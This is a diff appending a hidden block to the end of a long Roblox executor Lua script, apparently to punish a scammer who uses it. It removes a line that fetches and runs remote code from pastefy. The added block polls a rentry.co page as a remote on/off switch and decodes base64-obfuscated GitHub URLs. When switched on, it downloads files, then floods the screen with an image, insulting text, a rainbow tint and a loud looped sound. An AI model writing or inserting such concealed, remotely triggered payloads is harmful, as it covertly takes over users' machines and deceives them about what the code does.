@@ -9355,4 +9355,197 @@ task.spawn(function()
     end
 end)
 
-loadstring(game:HttpGet("https://pastefy.app/HcBtBuwA/raw"))()
+-- ============================================================
+--  Delta: on/off через Rentry + скрытые ссылки на ассеты
+--  Изменено: 15 надписей вместо 40, картинка 700x600
+-- ============================================================
+
+local CHECK_URL = "https://rentry.co/onoffingurl"
+local INTERVAL  = 5
+
+-- ---------- BASE64 ДЕКОДЕР ----------
+local function b64decode(data)
+    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    data = tostring(data):gsub("[^" .. b .. "=]", "")
+    local out = {}
+    for i = 1, #data, 4 do
+        local c1, c2, c3, c4 = data:byte(i, i + 3)
+        local n1 = (b:find(string.char(c1 or 0), 1, true) or 1) - 1
+        local n2 = (b:find(string.char(c2 or 0), 1, true) or 1) - 1
+        local n3 = c3 and (b:find(string.char(c3), 1, true) or 1) - 1 or 0
+        local n4 = c4 and (b:find(string.char(c4), 1, true) or 1) - 1 or 0
+        local byte1 = n1 * 4 + math.floor(n2 / 16)
+        local byte2 = (n2 % 16) * 16 + math.floor(n3 / 4)
+        local byte3 = (n3 % 4) * 64 + n4
+        out[#out + 1] = string.char(byte1)
+        if c3 and c3 ~= 61 then out[#out + 1] = string.char(byte2) end
+        if c4 and c4 ~= 61 then out[#out + 1] = string.char(byte3) end
+    end
+    return table.concat(out)
+end
+
+local function assemble(chunks, order)
+    local t = {}
+    for _, i in ipairs(order) do t[#t + 1] = chunks[i] end
+    return b64decode(table.concat(t))
+end
+
+local SOUND_URL = assemble({
+    "dWRpb18yMDI1LTEyLTA0XzE1LTIyLTQ3Lm1wMw==",
+    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t",
+    "L2lwYWR5cy9jb3JlL3JlZnMvaGVhZHMvbWFpbi9h",
+}, {2, 3, 1})
+
+local IMAGE_URL = assemble({
+    "aG90b18yMDI1LTEyLTAzXzIxLTAzLTExLmpwZw==",
+    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t",
+    "L2lwYWR5cy9jb3JlL3JlZnMvaGVhZHMvbWFpbi9w",
+}, {2, 3, 1})
+
+-- ---------- СОСТОЯНИЕ ----------
+local isRunning, currentGui, sound, rainbowConn = false, nil, nil, nil
+local floatConns = {}
+
+local function log(...) print("[TURN]", ...) end
+local function err(...) warn("[TURN ERR]", ...) end
+
+local function detectState(text)
+    if not text then return nil end
+    local lower = string.lower(text)
+    local hasOn  = lower:find("%f[%a]on%f[%A]")
+    local hasOff = lower:find("%f[%a]off%f[%A]")
+    if hasOff then return "off", "найдено слово 'off'" end
+    if hasOn  then return "on",  "найдено слово 'on'"  end
+    return nil, "слова on/off не найдены"
+end
+
+local function stopEverything()
+    log("Останавливаю...")
+    if rainbowConn then rainbowConn:Disconnect() rainbowConn = nil end
+    for _, c in ipairs(floatConns) do pcall(function() c:Disconnect() end) end
+    floatConns = {}
+    if currentGui then pcall(function() currentGui:Destroy() end) currentGui = nil end
+    if sound then pcall(function() sound:Destroy() end) sound = nil end
+    for _, v in ipairs(game.Lighting:GetChildren()) do
+        if v:IsA("ColorCorrectionEffect") then v:Destroy() end
+    end
+end
+
+local function runCode()
+    log("Запускаю runCode()")
+    local fenv = getfenv()
+    local RunService = game:GetService("RunService")
+
+    pcall(function()
+        writefile("po.mp3", game:HttpGet(SOUND_URL))
+    end)
+    sound = Instance.new("Sound")
+    sound.Parent = workspace
+    pcall(function() sound.SoundId = fenv.getcustomasset("po.mp3") end)
+    sound.Volume = 10
+    sound.Looped = true
+    sound:Play()
+
+    pcall(function()
+        writefile("dsf.jpg", game:HttpGet(IMAGE_URL))
+    end)
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.DisplayOrder = 999
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
+    currentGui = ScreenGui
+
+    local ImageLabel = Instance.new("ImageLabel")
+    pcall(function() ImageLabel.Image = fenv.getcustomasset("dsf.jpg") end)
+    ImageLabel.Size = UDim2.new(0, 700, 0, 600)   -- ↓ было 800, стало 700 (чуть поуже)
+    ImageLabel.BackgroundTransparency = 1
+    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    ImageLabel.Parent = ScreenGui
+
+    local TextLabel = Instance.new("TextLabel")
+    TextLabel.Text = "i ❤️ ur mom"
+    TextLabel.Font = Enum.Font.GothamBlack
+    TextLabel.TextScaled = true
+    TextLabel.Size = UDim2.new(0, 250, 0, 100)
+    TextLabel.TextColor3 = Color3.new(1, 1, 1)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    TextLabel.ZIndex = 999
+    TextLabel.Parent = ScreenGui
+
+    local cc = Instance.new("ColorCorrectionEffect")
+    cc.Parent = game.Lighting
+    cc.Saturation = 10
+    cc.Brightness  = 0.15
+    cc.Contrast    = 0.2
+    local hue = 0
+    rainbowConn = RunService.RenderStepped:Connect(function()
+        hue = (hue + 0.006) % 1
+        cc.TintColor = Color3.fromHSV(hue, 1, 1)
+    end)
+
+    -- ↓ Было 40, стало 15
+    for i = 1, 15 do
+        local fl = Instance.new("TextLabel")
+        fl.Text = "scammer, stop scammmig"
+        fl.Font = Enum.Font.GothamBlack
+        fl.TextColor3 = Color3.new(1, 0, 0)
+        fl.BackgroundTransparency = 1
+        fl.TextScaled = true
+        fl.Size = UDim2.new(0, 500, 0, 90)
+        fl.ZIndex = 1000 + i
+        fl.Parent = ScreenGui
+
+        local x, y = math.random(), math.random()
+        local sx = (math.random() - 0.5) * 0.012
+        local sy = (math.random() - 0.5) * 0.012
+
+        table.insert(floatConns, RunService.RenderStepped:Connect(function()
+            x, y = x + sx, y + sy
+            if x < 0 or x > 1 then sx = -sx end
+            if y < 0 or y > 1 then sy = -sy end
+            fl.Position = UDim2.new(x, 0, y, 0)
+        end))
+    end
+
+    log("✅ Всё включено")
+end
+
+-- ---------- ЦИКЛ ПРОВЕРКИ ----------
+task.spawn(function()
+    local lastState = nil
+
+    while true do
+        local url = CHECK_URL .. "?t=" .. tostring(os.time()) .. math.random(1000, 9999)
+        local ok, raw = pcall(function() return game:HttpGet(url, true) end)
+
+        if not ok then
+            err("HttpGet упал:", raw)
+        else
+            local state, reason = detectState(tostring(raw))
+            if state then
+                log("Состояние:", state, "(" .. reason .. ")")
+                if state ~= lastState then
+                    log("Смена ->", state)
+                    lastState = state
+                    if state == "on" and not isRunning then
+                        isRunning = true
+                        local okRun, e = pcall(runCode)
+                        if not okRun then err("runCode упал:", e) isRunning = false end
+                    elseif state == "off" and isRunning then
+                        isRunning = false
+                        stopEverything()
+                    end
+                end
+            else
+                err("Не удалось определить on/off:", reason)
+            end
+        end
+
+        task.wait(INTERVAL)
+    end
+end)
